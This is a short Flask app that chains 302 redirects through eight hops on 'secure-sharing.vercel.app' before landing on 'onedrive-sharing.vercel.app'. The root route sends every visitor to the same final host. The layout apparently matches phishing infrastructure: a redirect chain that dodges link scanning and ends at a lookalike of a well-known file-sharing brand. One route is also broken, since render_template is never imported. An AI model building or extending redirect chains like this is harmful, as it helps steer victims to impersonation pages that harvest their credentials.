from flask import Flask, request, redirect

app = Flask(__name__)

# Define redirection rules based on path
def get_redirect_url(path):
    if path == '/path1':
        return 'https://secure-sharing.vercel.app/path2'
    elif path == '/path2':
        return 'https://secure-sharing.vercel.app/path3'
    elif path == '/path3':
        return 'https://secure-sharing.vercel.app/path4'
    elif path == '/path4':
        return 'https://secure-sharing.vercel.app/path5'
    elif path == '/path5':
        return 'https://secure-sharing.vercel.app/path6'
    elif path == '/path6':
        return 'https://secure-sharing.vercel.app/path7'
    elif path == '/path7':
        return 'https://secure-sharing.vercel.app/path8'
    elif path == '/path8':
        return 'https://onedrive-sharing.vercel.app/'
    # Add more cases for additional paths and intermediary URLs as needed
    else:
        return 'https://onedrive-sharing.vercel.app/'

# Route to handle redirection for '/path1'
@app.route('/path1')
def path1_handler():
    redirect_url = get_redirect_url('/path1')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path2'
@app.route('/path2')
def path2_handler():
    redirect_url = get_redirect_url('/path2')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path3'
@app.route('/path3')
def path3_handler():
    redirect_url = get_redirect_url('/path3')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path4'
@app.route('/path4')
def path4_handler():
    redirect_url = get_redirect_url('/path4')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path5'
@app.route('/path5')
def path5_handler():
    redirect_url = get_redirect_url('/path5')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path6'
@app.route('/path6')
def path6_handler():
    redirect_url = get_redirect_url('/path6')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path7'
@app.route('/path7')
def path7_handler():
    redirect_url = get_redirect_url('/path7')
    return redirect(redirect_url, code=302)

# Route to handle redirection for '/path8'
@app.route('/path8')
def path8_handler():
    redirect_url = get_redirect_url('/path8')
    return redirect(redirect_url, code=302)

# Route to handle redirection for other paths
@app.route('/')
def redirect_path():
    path = request.path
    redirect_url = get_redirect_url(path)
    return redirect(redirect_url, code=302)

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
